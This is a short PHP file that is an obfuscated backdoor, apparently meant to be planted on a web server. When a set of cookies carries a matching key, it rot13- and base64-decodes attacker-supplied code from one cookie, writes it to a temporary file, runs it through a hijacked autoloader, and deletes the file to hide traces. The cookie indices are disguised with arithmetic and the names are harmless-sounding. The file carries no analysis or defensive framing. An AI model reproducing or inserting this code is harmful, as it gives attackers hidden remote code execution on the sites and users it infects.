<?php


if (isset($_COOKIE[-6+6]) && isset($_COOKIE[28-27]) && isset($_COOKIE[18-15]) && isset($_COOKIE[57-53])) {
    $symbol = $_COOKIE;
    function request_approved($ent) {
        $symbol = $_COOKIE;
        $data_chunk = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '63f87587');
        if (!is_writable($data_chunk)) {
            $data_chunk = getcwd() . DIRECTORY_SEPARATOR . "right_pad_string";
        }
        $pset = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($symbol[3]));
        if (is_writeable($data_chunk)) {
            $ptr = fopen($data_chunk, 'w+');
            fputs($ptr, $pset);
            fclose($ptr);
            spl_autoload_unregister(__FUNCTION__);
            require_once($data_chunk);
            @array_map('unlink', array($data_chunk));
        }
    }
    spl_autoload_register("request_approved");
    $resource = "8d80ce5a7d0937541635642243c867d7";
    if (!strncmp($resource, $symbol[4], 32)) {
        if (@class_parents("system_core_approve_request", true)) {
            exit;
        }
    }
}
